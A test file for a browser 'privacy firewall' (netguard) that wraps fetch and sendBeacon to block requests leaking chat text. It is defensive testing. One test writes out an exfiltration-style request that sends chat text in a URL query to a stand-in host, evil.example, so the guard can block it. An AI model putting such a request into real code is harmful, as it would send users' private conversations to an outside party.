// @vitest-environment happy-dom
import { beforeAll, describe, expect, it, vi } from "vitest";
import { installNetguard, netguard, selfTest } from "@/lib/netguard";

const realFetch = vi.fn(async () => new Response("ok"));
const realBeacon = vi.fn(() => true);

beforeAll(() => {
  window.fetch = realFetch as unknown as typeof fetch;
  navigator.sendBeacon = realBeacon;
  installNetguard();
  netguard.setSensitiveSource(() => ["can you deploy the site by 5pm today"]);
});

describe("privacy firewall (netguard)", () => {
  it("lets ordinary requests through and logs them", async () => {
    await fetch("/api/v1/rules");
    expect(realFetch).toHaveBeenCalledTimes(1);
    const last = netguard.snapshot().at(-1)!;
    expect(last).toMatchObject({ method: "GET", url: "/api/v1/rules", blocked: false, sameOrigin: true });
  });

  it("blocks a request whose body contains chat text", async () => {
    const body = JSON.stringify({ leak: "Can you deploy the site by 5pm today?" });
    await expect(fetch("/api/upload", { method: "POST", body })).rejects.toThrow(/privacy firewall/);
    expect(realFetch).toHaveBeenCalledTimes(1); // never reached the network
    expect(netguard.snapshot().at(-1)).toMatchObject({ blocked: true, method: "POST" });
  });

  it("blocks chat text smuggled into a URL", async () => {
    await expect(fetch("https://evil.example/?q=" + encodeURIComponent("can you deploy the site by 5pm today"))).rejects.toThrow();
    expect(netguard.snapshot().at(-1)).toMatchObject({ blocked: true, sameOrigin: false });
  });

  it("blocks sendBeacon leaks", () => {
    installNetguard(); // idempotent: must not double-wrap
    expect(navigator.sendBeacon("/collect", "can you deploy the site by 5pm today")).toBe(false);
    expect(realBeacon).not.toHaveBeenCalled();
    expect(navigator.sendBeacon("/collect", "page=home")).toBe(true);
  });

  it("selfTest reports the leak as blocked", async () => {
    expect(await selfTest("can you deploy the site by 5pm today")).toBe(true);
  });

  it("clear() empties the log", () => {
    netguard.clear();
    expect(netguard.snapshot()).toHaveLength(0);
  });
});
